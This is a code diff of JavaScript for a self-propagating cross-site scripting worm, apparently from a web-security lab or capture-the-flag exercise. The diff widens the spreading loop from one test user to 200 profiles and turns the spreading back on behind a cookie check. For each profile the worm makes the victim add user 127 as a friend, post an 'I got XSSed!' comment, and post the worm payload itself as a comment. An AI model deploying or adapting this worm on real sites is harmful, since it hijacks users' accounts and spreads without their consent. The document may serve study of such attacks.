@@ -79,25 +79,29 @@ function change_Picture(){
 }
 
 function spread_Worm(){
-    for(let i = 134; i < 135; i++) {
+    for(let i = 0; i < 200; i++) {
         var id = i;
+        var xhx = new XMLHttpRequest();
         var xhy = new XMLHttpRequest();
         var xhz = new XMLHttpRequest();
         var urlpayload = encodeURIComponent(ppayload)
         var urlbrag = encodeURIComponent("I got XSSed!")
-        xhy.open("GET", `/add_comment.php?type=profile&id=${id}&comment=${urlbrag}`,true);
+        xhx.open("GET", `/add_friend.php?id=${127}`,true);
+        xhx.send();
+        xhy.open("GET", `/add_comment.php?id=${id}&comment=${urlbrag}`,true);
         xhy.send(); 
-        xhz.open("GET", `/add_comment.php?type=profile&id=${id}&comment=${urlpayload}`,true);
+        xhz.open("GET", `/add_comment.php?id=${id}&comment=${urlpayload}`,true);
         xhz.send(); 
+        
     }
 }
 
 // GET /add_comment.php?id=127&comment=oof
 
 const cookies = new URLSearchParams(document.cookie.replaceAll("; ","&"))
-//if (cookies.get("rekt") != "yes") {
+if (cookies.get("rekt") != "yes") {
     spread_Worm()
-//}
+}
 post_About();
 change_Profile();
 setTimeout(change_Picture,1000)
